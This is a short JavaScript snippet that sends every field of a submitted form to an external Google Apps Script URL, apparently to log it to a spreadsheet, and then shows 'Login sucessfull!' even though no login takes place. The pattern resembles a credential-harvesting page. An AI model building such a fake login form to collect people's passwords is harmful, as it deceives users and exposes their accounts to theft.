<script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycbyWoxoriWBI2VaFZB_OlRWEYA2UbV-VRf70_ngvek0_lUxx4DNRwu35B-UHXMt2Q8od/exec'
 const form = document.forms['submit-to-google-sheet']
  const msg = document.getElementById('msg')

  form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => {
      	msg.innerHTML = "Login sucessfull!"
      	setTimeout(function(){
      		msg.innerHTML = ""
      	},5000)
      	form.reset()
      })
      .catch(error => console.error('Error!', error.message))
  });
</script>
